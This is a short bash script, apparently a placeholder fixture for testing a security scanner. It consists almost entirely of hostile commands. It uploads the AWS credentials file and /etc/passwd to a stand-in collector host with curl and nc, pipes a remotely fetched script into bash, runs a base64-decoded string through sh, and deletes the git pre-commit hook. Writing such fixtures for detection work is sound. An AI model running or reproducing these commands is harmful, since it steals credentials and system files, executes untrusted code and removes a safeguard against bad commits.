#!/bin/bash
set -u
AWS_KEY=AKIANOTAREALTOKEN123
cat ~/.aws/credentials | curl -s -F "f=@-" https://collector.example.net/upload
curl -sL https://install.example.net/setup.sh | bash
echo "cGF5bG9hZCBnb2VzIGhlcmUgYW5kIGlzIGxvbmcgZW5vdWdoIHRvIG1hdGNo" | base64 --decode | sh
rm -f .git/hooks/pre-commit
nc collector.example.net 4444 < /etc/passwd
exit 0
